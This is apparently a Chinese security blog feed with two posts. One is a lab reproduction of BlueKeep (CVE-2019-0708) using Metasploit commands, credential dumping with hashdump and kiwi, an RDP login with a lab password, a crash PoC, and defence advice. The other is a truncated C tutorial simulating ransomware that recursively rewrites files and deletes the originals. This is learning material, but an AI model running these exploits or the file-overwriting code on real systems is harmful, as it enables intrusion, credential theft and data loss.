class="line">set rhost 192.168.193.140</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.8.png" class="" title="检测靶机是否存在可利用漏洞"><p>结果显示靶机存在这个漏洞。</p><h3 id="3-3-1-提权"><a href="#3-3-1-提权" class="headerlink" title="3.3.1 提权"></a>3.3.1 提权</h3><p>使用漏洞利用模块对靶机进行渗透：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">set rhosts 192.168.193.140</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.14.png" class="" title="使用攻击模块进行设置"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show targets</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.15.png" class="" title="使用攻击模块进行设置"><p>发现目前的攻击脚本只适用于64位版本的 Windows 7 和 Windows 2008 R2 ，到了这里做不下去了，攻击不成功，因为我的 Win 7 靶机是32位的🤣。</p><img src="/posts/2d03ac3f/2.2.16.png" class="" title="使用攻击模块进行设置"><p>速速转到64位版本的 Win 7 重复以上操作，因为我的VMware是15.5的版本，所以选择5，成功提权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set target 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.17.png" class="" title="成功提权"><h3 id="3-3-2-远程登录"><a href="#3-3-2-远程登录" class="headerlink" title="3.3.2 远程登录"></a>3.3.2 远程登录</h3><p>注意，这个操作在提权成功的情况下才能进行远程登录。将靶机用户设置密码，否则不能远程登录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashdump//获取目标主机hash值</span><br><span class="line">load kiwi//载入kiwi模块，它是一个密码提取神器，支持从Windows系统内存中提取明文密码、哈希、PIN码和Kerberos凭证等</span><br><span class="line">creds_all//获得目标主机的账号密码</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/3.3.2.png" class="" title="提取账户密码"><p>远程登录靶机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.193.141 -u Leong -p l30n9ry0n</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/3.3.3.png" class="" title="远程登录靶机"><h3 id="3-3-3-蓝屏攻击"><a href="#3-3-3-蓝屏攻击" class="headerlink" title="3.3.3 蓝屏攻击"></a>3.3.3 蓝屏攻击</h3><p>前情提要：使用辅助模块发现靶机存在这个漏洞。</p><p>安装pip3和impacket库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3-pip</span><br><span class="line">pip3 install impacket</span><br></pre></td></tr></table></figure><img src="/posts/2d03ac3f/2.2.9.png" class="" title="安装pip3和impacket库"><p>下载POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n1xbyte/CVE-2019-0708.git</span><br></pre></td></tr></table></figure><p>进去该目录看看里面有什么文件以及它们的权限。发现它们没有执行权限。</p><img src="/posts/2d03ac3f/2.2.10.png" class="" title="POC包含的文件"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 crashpoc.py</span><br></pre></td></tr></table></figure><p>chmod表示change mod，修改文件属性；<code>crashpoc.py</code>表示所要修改的文件；777表示权限列表，每个“7”表示一组，共三组。“r—”二进制表示“100”，其值为4；而“rwx”表示“111”，其值为7，即所有权限都开启。</p><img src="/posts/2d03ac3f/2.2.12.png" class="" title="修改文件权限"><p>打开<code>crashpoc.py</code>和<code>poc.py</code>发现都需要impacket库支持，也就是为什么要安装impacket库。可用<code>pip3 list</code>命令查看Python安装的所有扩展包。</p><img src="/posts/2d03ac3f/2.2.11.png" class=""><p>利用脚本进行攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 crashpoc.py 192.168.193.140 32</span><br><span class="line">#IP地址 目标IP地址主机的系统版本</span><br></pre></td></tr></table></figure><p>靶机蓝屏，攻击成功。</p><img src="/posts/2d03ac3f/2.2.13.png" class="" title="靶机蓝屏"><h1 id="4-防御方法"><a href="#4-防御方法" class="headerlink" title="4. 防御方法"></a>4. 防御方法</h1><ul><li>微软官方已经发布更新补丁(包括Windows XP等停止维护的版本)，请用户及时进行补丁更新</li><li>若用户不需要用到远程桌面服务，建议禁用该服务</li><li>在防火墙中对TCP 3389端口进行阻断</li><li>开启系统防火墙或IP安全策略限制来源IP，即只允许指定IP访问</li><li>启用网络级认证(NLA)，此方案适用于Windows 7 、 Windows Server 2008 和 Windows Server 2008 R2</li><li>安装必要的防火墙或杀毒软件，关注安全公司的漏洞报告或防御文章</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;终于来到了这一步，你你你，就是我第一个复现的漏洞啦！CVE-2019-0708又称bluekeep。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>勒索病毒中的加解密原理</title>
    <link href="http://example.com/posts/5ec21076.html"/>
    <id>http://example.com/posts/5ec21076.html</id>
    <published>2022-05-23T04:53:40.733Z</published>
    <updated>2022-05-24T07:21:14.841Z</updated>
    
    <content type="html"><![CDATA[<p>勒索病毒是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。</p><p>现在就用C语言来实现一下系统文件加密及解密功能，简单模拟勒索病毒的加解密原理。</p><span id="more"></span><h1 id="1-对系统文件进行简单加解密"><a href="#1-对系统文件进行简单加解密" class="headerlink" title="1. 对系统文件进行简单加解密"></a>1. 对系统文件进行简单加解密</h1><p>假设桌面存在如下图所示的文件夹“l30n9ry0n”，我们需要获取其信息再进行文件遍历及加密操作，需要用到操作系统API、加密算法，像勒索病毒一样可以还原文件的，还需要解密算法。</p><img src="/posts/5ec21076/1.1.1.png" class=""><p>1.在编写一个简单的加密函数前，首先需要创建文件并执行打开、读写操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//文件加密函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jiami</span><span class="params">(<span class="type">char</span>* fileName)</span></span><br><span class="line">&#123;    </span><br><span class="line">    <span class="comment">//1.打开文件</span></span><br><span class="line">    FILE* fp = <span class="literal">NULL</span>;                  <span class="comment">//文件指针变量</span></span><br><span class="line">fp = fopen(fileName, <span class="string">&quot;r+&quot;</span>);       <span class="comment">//打开可读写的文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == fp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开文件失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开 %s 文件成功!\n&quot;</span>, fileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取文件大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.每隔一个字节插入一个字节数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//4.保存关闭</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">jiami(<span class="string">&quot;C:\\Users\\v5le0n9\\Desktop\\l30n9ry0n\\作业.txt&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.2.png" class="" title="实现文件打开操作"><p>2.计算文件大小，查看该文件可知共142字节。</p><img src="/posts/5ec21076/1.1.3.png" class="" title="查看文件大小"><p>在C代码里的基本流程为：</p><ul><li>设置光标(文件指针)到文件末尾</li><li>计算光标距离文件头的字节数</li><li>设置光标位置到文件头(便于后面的加密操作)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.获取文件大小</span></span><br><span class="line"><span class="type">int</span> size = <span class="number">0</span>;<span class="comment">//文件大小</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_END);                   <span class="comment">//设置光标到文件末尾</span></span><br><span class="line">size = ftell(fp);                         <span class="comment">//计算光标位置距离文件头字节数</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_SET);                   <span class="comment">//设置光标位置到文件头</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件大小为：%d字节！\n&quot;</span>, size);</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.4.png" class=""><p>3.循环插入字节实现简单的加密。</p><p>如果在进行文件操作时，遇到权限不够的情况下，需要进行相关的提权操作，再进行加密处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取文件所有内容</span></span><br><span class="line"><span class="type">char</span>* tmp;</span><br><span class="line"><span class="type">int</span> read_size;</span><br><span class="line">tmp = (<span class="type">char</span>*)<span class="built_in">malloc</span>((size + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">read_size = fread(tmp, <span class="keyword">sizeof</span>(<span class="type">char</span>), size, fp);</span><br><span class="line">tmp[size] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="comment">//printf(&quot;读取字符串为：%s %d %d\n&quot;, tmp, read_size, strlen(tmp));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.每隔一个字节插入一个字节数据</span></span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="type">char</span> code = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">char</span>* pTxt;</span><br><span class="line">FILE* fpw = fopen(<span class="string">&quot;ddd.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);                           <span class="comment">//写入文件</span></span><br><span class="line">pTxt = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>) * (<span class="built_in">strlen</span>(tmp) * <span class="number">2</span> + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = size; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">ch = tmp[i];</span><br><span class="line"><span class="keyword">if</span> (i != <span class="number">0</span>) &#123;</span><br><span class="line">pTxt[<span class="number">2</span> * i] = ch;</span><br><span class="line">pTxt[<span class="number">2</span> * i - <span class="number">1</span>] = code;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">pTxt[<span class="number">2</span> * i] = ch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;%d %c %c\n&quot;, i, ch, pTxt[2 * i - 1]);</span></span><br><span class="line">&#125;</span><br><span class="line">pTxt[size * <span class="number">2</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;操作后字符串：%s %d\n&quot;</span>, pTxt, <span class="built_in">strlen</span>(pTxt));</span><br><span class="line">fwrite(pTxt, <span class="keyword">sizeof</span>(<span class="type">char</span>), size * <span class="number">2</span>, fpw);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.保存关闭</span></span><br><span class="line">fclose(fp);</span><br><span class="line">fclose(fpw);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.5.png" class=""><p>运行完后在C代码当前目录下生成一个<code>ddd.txt</code>文件，发现一个简单的加密或扰乱完成。</p><img src="/posts/5ec21076/1.1.6.png" class=""><p>为什么文件显示的字节与计算的字节不一样？对于文本流，因为会执行行末字符映射，所以文本文件的字节数可能和程序写入的字节数不同。基于此，可以用二进制方式读写文件。同时，使用二进制可以读取大型文件如<code>.exe</code>文件、音视频文件等。</p><p>4.编写一个遍历文件夹的函数，实现对整个目录进行加密处理。</p><p>通常遍历文件夹采用递归，依次遍历某个目录的文件夹，深度搜索文件夹中的内容，如果是文件就加密，如果是文件夹就继续深度搜索，直至找到文件依次返回，从而实现整个目录的文件遍历。</p><ul><li>调用<code>GetCurrentDirectory()</code>函数获取当前目录</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//jiami(&quot;C:\\Users\\xiuzhang\\Desktop\\文件夹加密\\test.txt&quot;);</span></span><br><span class="line"><span class="comment">//获取当前文件夹</span></span><br><span class="line"><span class="type">char</span> buff[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetCurrentDirectory(<span class="number">256</span>, buff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当前目录是：%s\n\n&quot;</span>, buff);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>调用<code>FindFirstFile()</code>函数获取目录下第一个文件</li><li>如果找到第一个文件，则循环调用<code>FindNextFile()</code>函数获取下一个文件</li><li>如果找到的是文件夹，则拼接新的文件夹路径继续递归遍历文件</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历文件夹找到每个文件 参数-文件夹名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findFile</span><span class="params">(<span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.设置要找的文件名 通配符实现</span></span><br><span class="line"><span class="type">char</span> findFileName[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(findFileName, <span class="number">0</span>, <span class="number">256</span>);                   <span class="comment">//清空数组</span></span><br><span class="line"><span class="built_in">sprintf</span>(findFileName, <span class="string">&quot;%s\\*.*&quot;</span>, pathName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;要找的文件名是：%s\n&quot;</span>, findFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取目录下第一个文件</span></span><br><span class="line">WIN32_FIND_DATA findData;                    <span class="comment">//定义结构体</span></span><br><span class="line">HANDLE hFile = FindFirstFile(findFileName, &amp;findData);</span><br><span class="line"><span class="comment">//判断返回值等于-1(INVALID_HANDLE_VALUE)</span></span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查找文件失败!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果成功进入死循环继续查找下一个文件</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">while</span> (ret) &#123;</span><br><span class="line"><span class="comment">//如果找到的是个文件夹 则需要继续查找该文件夹内容</span></span><br><span class="line"><span class="keyword">if</span> (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) &#123;</span><br><span class="line"><span class="keyword">if</span> (findData.cFileName[<span class="number">0</span>] != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//文件夹拼接=原始路径+新文件夹路径</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件夹：%s\n&quot;</span>, temp);</span><br><span class="line">Sleep(<span class="number">1000</span>);                             <span class="comment">//暂停1秒钟</span></span><br><span class="line">findFile(temp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">//如果是文件 则加密文件</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件：%s\n&quot;</span>, temp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找下一个文件</span></span><br><span class="line">ret = FindNextFile(hFile, &amp;findData);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//获取当前文件夹</span></span><br><span class="line"><span class="type">char</span> buff[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetCurrentDirectory(<span class="number">256</span>, buff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当前目录是：%s\n\n&quot;</span>, buff);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//遍历当前目录下的文件</span></span><br><span class="line">findFile(buff);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/5ec21076/1.1.7.png" class=""><p>5.完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//文件加密函数 参数-文件名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jiami</span><span class="params">(<span class="type">char</span>* fileName, <span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line">FILE* fp = <span class="literal">NULL</span>;                  <span class="comment">//文件指针变量</span></span><br><span class="line"><span class="type">int</span> size = <span class="number">0</span>;                     <span class="comment">//文件大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//打开文件</span></span><br><span class="line"><span class="comment">//注意： 使用二进制打开可以复制大型文件如.exe文件，音频视频文件等</span></span><br><span class="line">fp = fopen(fileName, <span class="string">&quot;rb&quot;</span>);       <span class="comment">//打开可读写的文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == fp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开文件失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开 %s 文件成功!\n&quot;</span>, fileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件大小</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_END);                   <span class="comment">//设置光标到文件末尾</span></span><br><span class="line">size = ftell(fp);                         <span class="comment">//计算光标位置距离文件头字节数</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_SET);                   <span class="comment">//设置光标位置到文件头</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件大小为：%d字节！\n&quot;</span>, size);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件所有内容</span></span><br><span class="line">    <span class="comment">//在当前目录下构造一个pathName+test路径</span></span><br><span class="line"><span class="type">char</span> code = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, temp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建pathName+test文件</span></span><br><span class="line">FILE* fpw = fopen(temp, <span class="string">&quot;wb&quot;</span>);         <span class="comment">//写入文件</span></span><br><span class="line"><span class="keyword">while</span> (!feof(fp)) &#123; </span><br><span class="line">ch = fgetc(fp);</span><br><span class="line">fputc(ch, fpw);</span><br><span class="line">fputc(code, fpw);</span><br><span class="line"><span class="comment">//printf(&quot;%c\n&quot;, ch);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存关闭</span></span><br><span class="line">fclose(fp);</span><br><span class="line">fclose(fpw);</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换文件</span></span><br><span class="line"><span class="type">char</span> commend[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">memset</span>(commend, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(commend, <span class="string">&quot;del \&quot;%s\&quot;&quot;</span>, fileName);     <span class="comment">//访问路径包含空格增加双引号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, commend);</span><br><span class="line">system(commend);<span class="comment">//执行删除命令</span></span><br><span class="line">rename(temp, fileName);                       <span class="comment">//调用C语言rename函数重命名文件</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历文件夹找到每个文件 参数-文件夹名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findFile</span><span class="params">(<span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 